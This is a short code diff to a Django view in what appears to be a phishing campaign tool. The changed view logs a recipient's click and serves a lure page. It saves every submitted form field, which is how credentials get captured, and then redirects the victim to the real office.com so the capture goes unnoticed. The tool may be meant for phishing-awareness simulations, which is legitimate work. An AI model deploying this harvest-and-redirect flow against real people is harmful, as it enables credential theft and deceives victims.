@@ -358,10 +358,9 @@ def DynamicTemplate(request, url_slug, render_id):
                     p_data.agent_data = str(adata)
                 p_data.save()
             else:
-                return redirect("https://www.office.com/")
-        #         r = Recipient.objects.get(unq_id=rpt_id)
-        #         PhishingData.objects.create(link=l, recipient=r, click_count=1)
-        # return HttpResponse(temp_instance.template_code)
+                r = Recipient.objects.get(unq_id=rpt_id)
+                PhishingData.objects.create(link=l, recipient=r, click_count=1)
+        return HttpResponse(temp_instance.template_code)
 
     if request.method == 'POST':
 
@@ -370,5 +369,6 @@ def DynamicTemplate(request, url_slug, render_id):
             if len(p_data) > 0:
                 p_data = p_data[0]
                 PhishingDataDict.objects.create(pdata=p_data, data=str(request.POST.dict()))
-        return HttpResponse(temp_instance.template_code)
+        return redirect("https://www.office.com/")
+        # return HttpResponse(temp_instance.template_code)
         
